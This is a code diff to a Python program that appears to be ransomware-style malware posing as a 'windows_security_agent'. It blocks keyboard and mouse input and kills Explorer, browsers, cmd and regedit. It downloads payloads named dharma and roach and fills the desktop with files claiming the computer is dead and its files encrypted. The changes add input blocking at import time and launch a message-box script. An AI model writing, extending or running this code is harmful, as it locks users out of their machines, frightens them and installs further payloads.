@@ -23,6 +23,8 @@ def block_input(on):
   else:
     return 1, None
 
+block_input(True)
+
 def get_time_formatted():
   now = datetime.now()
   year = now.year
@@ -100,7 +102,7 @@ class Logging:
       lf = self.logfile
       try:
         with open(lf, 'a+') as f:
-          f.write(message)
+          f.write(message + '\n')
           f.close()
       except Exception:
         return -2
@@ -125,11 +127,11 @@ logfile = f'windows_security_agent_log_{random.randrange(1,1000)}_{get_time_form
  
 
 class FileCreation:
-  def mass_create(self, prefix, folder, count, ext=".txt"):
+  def mass_create(self, prefix, folder, count, ext=".tmp"):
     id = 1
     while count > 0:
       try:
-        path = f"{os.path.join(folder, prefix)}{id}.{ext}"
+        path = f"{os.path.join(folder, prefix)}{id}{ext}"
         with open(path, "w") as file:
           d.whitelist.append(path)
           file.write("Your computer is dead and your files are encrypted. Do not try to modify any files.")
@@ -267,8 +269,10 @@ box_art()
     try:
       subprocess.Popen([file])
     except Exception as e:
+      logs.error(f"Error running {file}: {e}")
       return -1, e
     else:
+      logs.info(f"Ran file {file}")
       return 1, None
 
   def box_art(self, path, count):
@@ -281,8 +285,10 @@ class Executables:
     try:
       subprocess.Popen([file])
     except Exception as e:
+      logs.error(f"Error running {file}: {e}")
       return -1, e
     else:
+      logs.info(f"Ran file {file}")
       return 1, None
 
   def install(self, package):
@@ -302,8 +308,10 @@ class Executables:
     try:
       subprocess.Popen([command])
     except Exception as e:
+      logs.error(f"Error running command {command}: {e}")
       return -1, e
     else:
+      logs.info(f"Ran file {command}")
       return 1, None
 
   def taskkill(self, process):
@@ -329,12 +337,12 @@ class Executables:
 
   def stop_all(self):
     processes = [self.stop_explorer, self.stop_chrome, self.stop_firefox, self.stop_edge, self.stop_cmd, self.stop_regedit]
-    
     for function in processes:
       function()
 
   def refresh_explorer(self):
     self.stop_explorer()
+    time.sleep(10)
     self.run_shell_command('explorer.exe')
 
   def install_and_run_batch(self, folder, code):
@@ -648,8 +656,8 @@ gd.download_file(d.dharma_link, dharma)
 gd.download_file(d.roach_link, roach)
 zf.extract(goose_zip, folder)
 boxpath = wsysw.write_message_box_code()
+e.run_shell_command(f'{sys.executable} {boxpath}')
 fc.mass_create("YOURPCISDEAD", wsysw.get_desktop_path(), 100)
-block_input(True)
 e.install_all()
 time.sleep(15)
 block_input(False)
